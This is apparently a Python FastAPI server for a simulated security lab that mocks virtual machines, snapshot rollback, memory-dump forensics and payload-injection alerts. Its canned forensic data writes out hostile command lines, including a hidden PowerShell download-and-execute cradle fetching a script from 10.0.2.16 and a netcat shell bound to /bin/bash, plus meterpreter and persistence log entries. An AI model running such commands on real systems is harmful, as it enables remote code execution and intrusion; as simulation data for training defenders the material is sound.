import asyncio
import json
import random
import time
import os
from typing import Dict, List, Any
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel

app = FastAPI(title="Sentinel V-Axiom Virtualization & TISET Core")

# Enable CORS for frontend
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Simulated VM storage location
VM_STORAGE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vm_storage")
os.makedirs(VM_STORAGE_DIR, exist_ok=True)

# VM State definitions
VMS: Dict[str, Dict[str, Any]] = {
    "win2025": {
        "id": "win2025",
        "name": "Windows Server 2025 (Active Directory)",
        "status": "running",
        "os": "windows",
        "ip": "10.0.2.15",
        "ram_usage": "1840MB",
        "active_overlay": "snap_win_active.qcow2",
        "uptime": 5090,  # in seconds
        "threat_level": "low",
        "alerts_count": 2,
        "logs": [
            {"time": "01:22:15", "source": "Microsoft-Windows-Security-Auditing", "event_id": 4624, "desc": "An account was successfully logged on. User: Administrator"},
            {"time": "01:23:42", "source": "Microsoft-Windows-Sysmon", "event_id": 1, "desc": "Process Creation: svchost.exe (PID 1024)"}
        ]
    },
    "kali": {
        "id": "kali",
        "name": "Kali Linux (Forensics & Attack)",
        "status": "stopped",
        "os": "linux",
        "ip": "10.0.2.16",
        "ram_usage": "0MB",
        "active_overlay": "snap_kali_active.qcow2",
        "uptime": 0,
        "threat_level": "none",
        "alerts_count": 0,
        "logs": []
    },
    "android": {
        "id": "android",
        "name": "Android Emulator Core (ARM64)",
        "status": "running",
        "os": "android",
        "ip": "10.0.2.20",
        "ram_usage": "720MB",
        "active_overlay": "snap_android_active.qcow2",
        "uptime": 2712,
        "threat_level": "medium",
        "alerts_count": 4,
        "logs": [
            {"time": "00:41:02", "source": "AndroidRuntime", "event_id": 109, "desc": "ActivityManager: Start proc com.android.settings"},
            {"time": "00:43:18", "source": "Zygote", "event_id": 55, "desc": "System server socket connection established"},
            {"time": "00:44:00", "source": "Auditd", "event_id": 1400, "desc": "avc: denied { read } for pid=5820 comm=\"su\" path=\"/system/bin\""}
        ]
    },
    "ios": {
        "id": "ios",
        "name": "iOS Sandbox (Darwin Emulated)",
        "status": "running",
        "os": "ios",
        "ip": "10.0.2.21",
        "ram_usage": "890MB",
        "active_overlay": "snap_ios_active.qcow2",
        "uptime": 933,
        "threat_level": "high",
        "alerts_count": 9,
        "logs": [
            {"time": "00:10:05", "source": "Kernel", "event_id": 0, "desc": "Darwin Kernel Version 23.1.0: xnu-10002.41.9~6/RELEASE_ARM64"},
            {"time": "00:12:19", "source": "Securityd", "event_id": 1102, "desc": "entitlement check failed for process: trustd"},
            {"time": "00:14:50", "source": "SpringBoard", "event_id": 990, "desc": "Memory pressure event triggered: Critical"}
        ]
    }
}

# Injected Payload logs (simulated attacker activities)
MALWARE_LOGS = {
    "win2025": [
        {"source": "Microsoft-Windows-Sysmon", "event_id": 1, "desc": "Process Creation: cmd.exe /c download-payload.ps1 (PID 4912)"},
        {"source": "Microsoft-Windows-Sysmon", "event_id": 3, "desc": "Network connection detected: Source 10.0.2.15 -> Destination 185.220.101.4:443 (TCP)"},
        {"source": "Microsoft-Windows-Sysmon", "event_id": 11, "desc": "File Create: C:\\Windows\\Temp\\srv_host_agent.exe"},
        {"source": "Microsoft-Windows-Security-Auditing", "event_id": 4673, "desc": "Sensitive Privilege Use: SeBackupPrivilege requested by srv_host_agent.exe"},
        {"source": "Microsoft-Windows-Sysmon", "event_id": 12, "desc": "Registry Event: Registry key created: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SpywareAgent"}
    ],
    "kali": [
        {"source": "auditd", "event_id": 1300, "desc": "syscall=56 (clone) success for user=root"},
        {"source": "systemd", "event_id": 1, "desc": "Started SSH Key Generation Service"},
        {"source": "auditd", "event_id": 1302, "desc": "network socket bind to 0.0.0.0:4444 - reverse listener active"}
    ],
    "android": [
        {"source": "Auditd", "event_id": 1400, "desc": "avc: granted { execmem } for pid=7124 comm=\"meterpreter\""},
        {"source": "libc", "event_id": 2, "desc": "dlopen(\"/data/data/com.example/libpayload.so\") loaded bypass mechanisms"},
        {"source": "NetworkStats", "event_id": 201, "desc": "App uid 10182 transmitted 24.5MB over cell network in 10 seconds"}
    ],
    "ios": [
        {"source": "Kernel", "event_id": 9, "desc": "Sandbox violation: amfi (Apple Mobile File Integrity) bypass detected"},
        {"source": "MobileSafari", "event_id": 401, "desc": "Safari WebContent process crashed (exploit heap spray suspected)"},
        {"source": "SpringBoard", "event_id": 1205, "desc": "User interface launched: Cydia Installer Core (de-packaged)"}
    ]
}

# Request schema models
class VMAction(BaseModel):
    id: str

class VMInjectAction(BaseModel):
    id: str
    payload: str

# Create dummy storage files to represent the virtual disks
def initialize_virtual_storage():
    for vm_id in VMS:
        base_disk = os.path.join(VM_STORAGE_DIR, f"{vm_id}_base.qcow2")
        overlay_disk = os.path.join(VM_STORAGE_DIR, f"snap_{vm_id}_active.qcow2")
        
        # Write mock binary files to simulate QCOW2 structures
        if not os.path.exists(base_disk):
            with open(base_disk, "wb") as f:
                f.write(b"QFI\xfb\x00\x00\x00\x03" + b"\x00" * 1024)
        if not os.path.exists(overlay_disk):
            with open(overlay_disk, "wb") as f:
                f.write(b"QFI\xfb\x00\x00\x00\x03[OVERLAY_OF_" + vm_id.encode() + b"]" + b"\x00" * 512)

initialize_virtual_storage()

@app.get("/api/vm/list")
async def list_vms():
    # Update uptimes for running VMs before returning
    for vm_id, vm in VMS.items():
        if vm["status"] == "running":
            vm["uptime"] += 2  # increment simulated uptime
    
    # Format and return VMS list
    return list(VMS.values())

@app.post("/api/vm/launch")
async def launch_vm(action: VMAction):
    vm_id = action.id
    if vm_id not in VMS:
        raise HTTPException(status_code=404, detail="VM not found")
    
    vm = VMS[vm_id]
    if vm["status"] == "running":
        return {"status": "already_running", "message": f"{vm['name']} is already active."}
    
    # Simulate booting
    vm["status"] = "running"
    vm["uptime"] = 1
    vm["ram_usage"] = "1024MB" if vm_id != "win2025" else "1840MB"
    vm["threat_level"] = "low" if vm_id == "win2025" else "none"
    vm["logs"].append({
        "time": time.strftime("%H:%M:%S"),
        "source": "Hypervisor",
        "event_id": 100,
        "desc": f"VM Boot Sequence initiated. Active overlay: {vm['active_overlay']}"
    })
    
    # Touch overlay file
    overlay_disk = os.path.join(VM_STORAGE_DIR, vm["active_overlay"])
    with open(overlay_disk, "wb") as f:
        f.write(b"QFI\xfb\x00\x00\x00\x03[REBOOTED_OVERLAY_" + vm_id.encode() + b"]" + b"\x00" * 512)
        
    return {"status": "success", "message": f"{vm['name']} booted successfully.", "vm": vm}

@app.post("/api/vm/rollback")
async def rollback_vm(action: VMAction):
    vm_id = action.id
    if vm_id not in VMS:
        raise HTTPException(status_code=404, detail="VM not found")
    
    vm = VMS[vm_id]
    
    # Perform physical rollbacks on mock QCOW2 files
    overlay_disk = os.path.join(VM_STORAGE_DIR, vm["active_overlay"])
    if os.path.exists(overlay_disk):
        os.remove(overlay_disk)
    
    # Create fresh overlay (instant restoration)
    with open(overlay_disk, "wb") as f:
        f.write(b"QFI\xfb\x00\x00\x00\x03[ROLLEDBACK_CLEAN_OVERLAY_" + vm_id.encode() + b"]" + b"\x00" * 512)
        
    # Reset VM details to baseline clean state
    vm["status"] = "running"
    vm["uptime"] = 5
    vm["threat_level"] = "none"
    vm["alerts_count"] = 0
    vm["ram_usage"] = "1024MB" if vm_id != "win2025" else "1512MB"
    vm["logs"] = [{
        "time": time.strftime("%H:%M:%S"),
        "source": "TISET-Engine",
        "event_id": 200,
        "desc": "Time Inversion Complete. Disk and RAM rolled back to block checkpoint 0x00FF8E12"
    }]
    
    return {"status": "success", "message": f"Temporal state rolled back. Clean baseline restored for {vm['name']}.", "vm": vm}

@app.post("/api/vm/ramdump")
async def ramdump_vm(action: VMAction):
    vm_id = action.id
    if vm_id not in VMS:
        raise HTTPException(status_code=404, detail="VM not found")
    
    vm = VMS[vm_id]
    if vm["status"] != "running":
        raise HTTPException(status_code=400, detail="VM must be running to extract RAM dump")
        
    # Carve forensic structures
    is_compromised = vm["threat_level"] in ["medium", "high"]
    
    processes = [
        {"pid": 4, "name": "System" if vm["os"] == "windows" else "init/kthreadd", "integrity": "SYSTEM"},
        {"pid": 112, "name": "services.exe" if vm["os"] == "windows" else "systemd", "integrity": "SYSTEM"},
    ]
    
    carved_strings = ["Global\\KernelSecureToken", "SOC_Agent_Active=1"]
    
    if vm["os"] == "windows":
        processes.append({"pid": 412, "name": "lsass.exe", "integrity": "SYSTEM"})
        processes.append({"pid": 2840, "name": "explorer.exe", "integrity": "User"})
        if is_compromised:
            processes.append({
                "pid": 4912, 
                "name": "powershell.exe", 
                "integrity": "User", 
                "command_line": "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.0.2.16/payload.ps1'))\"", 
                "suspicious": True
            })
            carved_strings.extend([
                "http://10.0.2.16/payload.ps1",
                "10.0.2.16",
                "powershell -nop -w hidden",
                "C:\\Windows\\Temp\\srv_host_agent.exe",
                "S-1-5-18-SYSTEM-BYPASS-TOKEN"
            ])
    elif vm["os"] == "linux":
        processes.append({"pid": 820, "name": "sshd", "integrity": "SYSTEM"})
        if is_compromised:
            processes.append({
                "pid": 5824,
                "name": "nc",
                "integrity": "root",
                "command_line": "nc -lvnp 4444 -e /bin/bash",
                "suspicious": True
            })
            carved_strings.extend([
                "nc -lvnp 4444",
                "reverse_shell_active",
                "/bin/bash -i"
            ])
    elif vm["os"] == "android":
        processes.append({"pid": 240, "name": "system_server", "integrity": "SYSTEM"})
        if is_compromised:
            processes.append({
                "pid": 7124,
                "name": "meterpreter",
                "integrity": "root",
                "command_line": "./meterpreter_arm64 --daemon",
                "suspicious": True
            })
            carved_strings.extend([
                "meterpreter_arm64",
                "LVM_DTC_ANDROID_BYPASS",
                "10.0.2.16:4444"
            ])
    elif vm["os"] == "ios":
        processes.append({"pid": 84, "name": "SpringBoard", "integrity": "mobile"})
        if is_compromised:
            processes.append({
                "pid": 1205,
                "name": "cydia",
                "integrity": "root",
                "command_line": "/Applications/Cydia.app/Cydia",
                "suspicious": True
            })
            carved_strings.extend([
                "Cydia.app/Cydia",
                "jailbreak_exploit_payload",
                "amfi_bypass_darwin"
            ])
            
    return {
        "status": "success",
        "dump_file": f"memdump_{vm_id}_{int(time.time())}.raw",
        "size_bytes": 4294967296 if vm_id == "win2025" else 2147483648,
        "analyzed_processes": processes,
        "carved_strings": carved_strings
    }

@app.post("/api/vm/inject")
async def inject_payload(action: VMInjectAction):
    vm_id = action.id
    payload = action.payload
    if vm_id not in VMS:
        raise HTTPException(status_code=404, detail="VM not found")
        
    vm = VMS[vm_id]
    if vm["status"] != "running":
        raise HTTPException(status_code=400, detail="VM must be running to inject payload")
        
    # Set VM to compromised state
    vm["threat_level"] = "high"
    vm["alerts_count"] += len(MALWARE_LOGS.get(vm_id, []))
    
    # Append malware logs
    injected_logs = []
    current_time = time.time()
    for i, log in enumerate(MALWARE_LOGS.get(vm_id, [])):
        log_time = time.strftime("%H:%M:%S", time.localtime(current_time + i * 2))
        full_log = {
            "time": log_time,
            "source": log["source"],
            "event_id": log["event_id"],
            "desc": log["desc"]
        }
        vm["logs"].append(full_log)
        injected_logs.append(full_log)
        
    return {
        "status": "success",
        "message": f"Malware payload '{payload}' successfully injected. Kernel event monitors triggered.",
        "vm": vm,
        "triggered_logs": injected_logs
    }

@app.websocket("/ws/vm-stream")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    
    # Receive client initialization (VM ID selection)
    try:
        init_data = await websocket.receive_text()
        init_json = json.loads(init_data)
        vm_id = init_json.get("vm_id", "win2025")
    except Exception:
        vm_id = "win2025"
        
    if vm_id not in VMS:
        await websocket.send_json({"error": "Invalid VM ID"})
        await websocket.close()
        return

    # Connection loop
    try:
        # Send initial VM configuration
        await websocket.send_json({
            "type": "init",
            "vm": VMS[vm_id],
            "message": f"Connected to {VMS[vm_id]['name']} kernel console stream."
        })
        
        step = 0
        while True:
            # Check for client messages asynchronously (non-blocking)
            try:
                # We can wait for input with a tiny timeout, or just do periodic telemetry emission
                # Let's use asyncio.wait_for to read any commands from the frontend terminal
                client_message = await asyncio.wait_for(websocket.receive_text(), timeout=0.5)
                cmd_data = json.loads(client_message)
                if cmd_data.get("type") == "keystroke":
                    # echo back keystroke or execute command mock
                    key = cmd_data.get("key", "")
                    await websocket.send_json({
                        "type": "terminal_echo",
                        "key": key
                    })
                elif cmd_data.get("type") == "command":
                    cmd = cmd_data.get("command", "")
                    # Execute a mock response based on command
                    response = f"\r\nGuestOS@localhost:~$ {cmd}\r\n"
                    if "ls" in cmd:
                        response += "total 24\r\n-rw-r--r-- 1 root root 1024 May 22 01:50 secret_data.db\r\ndrwxr-xr-x 2 root root 4096 May 22 01:54 system_core\r\n"
                    elif "whoami" in cmd:
                        response += "root\r\n" if vm_id != "win2025" else "nt authority\\system\r\n"
                    elif "ipconfig" in cmd or "ifconfig" in cmd:
                        response += f"inet addr:{VMS[vm_id]['ip']}  Bcast:10.0.2.255  Mask:255.255.255.0\r\n"
                    elif "cat" in cmd:
                        response += "Access Denied: Read protection active under current hypervisor integrity.\r\n"
                    else:
                        response += f"executing simulated command: {cmd}...\r\n"
                    await websocket.send_json({
                        "type": "terminal_output",
                        "output": response
                    })
            except asyncio.TimeoutError:
                # No messages, just proceed to emit metrics
                pass
                
            # Periodic Telemetry Emitters (every 2-3 seconds)
            step += 1
            if step % 4 == 0:  # ~ every 2 seconds
                vm = VMS[vm_id]
                if vm["status"] == "running":
                    # CPU oscillates between baseline and spikes if threat is high
                    cpu_baseline = 15 if vm["threat_level"] == "none" else (40 if vm["threat_level"] == "medium" else 75)
                    cpu = min(99, max(2, cpu_baseline + random.randint(-10, 10)))
                    
                    ram_val = float(vm["ram_usage"].replace("MB", ""))
                    ram_fluctuation = random.randint(-15, 15) if vm["threat_level"] != "high" else random.randint(20, 100)
                    new_ram = max(500, int(ram_val + ram_fluctuation))
                    vm["ram_usage"] = f"{new_ram}MB"
                    
                    network_tx = random.randint(10, 250) if vm["threat_level"] != "high" else random.randint(5000, 45000)
                    network_rx = random.randint(100, 900) if vm["threat_level"] != "high" else random.randint(10000, 95000)
                    
                    await websocket.send_json({
                        "type": "telemetry",
                        "metrics": {
                            "cpu": cpu,
                            "ram": vm["ram_usage"],
                            "disk_read": f"{random.uniform(0.1, 4.5):.2f} MB/s",
                            "disk_write": f"{random.uniform(0.1, 10.2 if vm['threat_level'] == 'high' else 1.2):.2f} MB/s",
                            "network_tx": f"{network_tx} KB/s",
                            "network_rx": f"{network_rx} KB/s"
                        }
                    })
                    
            # Occasionally send a random event log if VM is active
            if step % 10 == 0:
                vm = VMS[vm_id]
                if vm["status"] == "running":
                    sources = ["Kernel", "Auditd", "NetworkStats", "Securityd", "Microsoft-Windows-Sysmon", "Microsoft-Windows-Security-Auditing"]
                    src = random.choice(sources)
                    descriptions = [
                        "TCP Connection Outbound established to port 80",
                        "Registry query for hardware devices",
                        "Audit policy checked by system process",
                        "Memory cleanup completed",
                        "DHCP lease renewed successfully",
                        "File system integrity validation check completed"
                    ]
                    log_entry = {
                        "time": time.strftime("%H:%M:%S"),
                        "source": src,
                        "event_id": random.randint(1000, 9999),
                        "desc": random.choice(descriptions)
                    }
                    # Keep logs capped
                    if len(vm["logs"]) > 20:
                        vm["logs"].pop(1)  # keep boot log
                    vm["logs"].append(log_entry)
                    
                    await websocket.send_json({
                        "type": "new_log",
                        "log": log_entry
                    })
                    
    except WebSocketDisconnect:
        pass
    except Exception as e:
        print(f"WS error: {e}")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("virtualization_server:app", host="127.0.0.1", port=3002, reload=True)
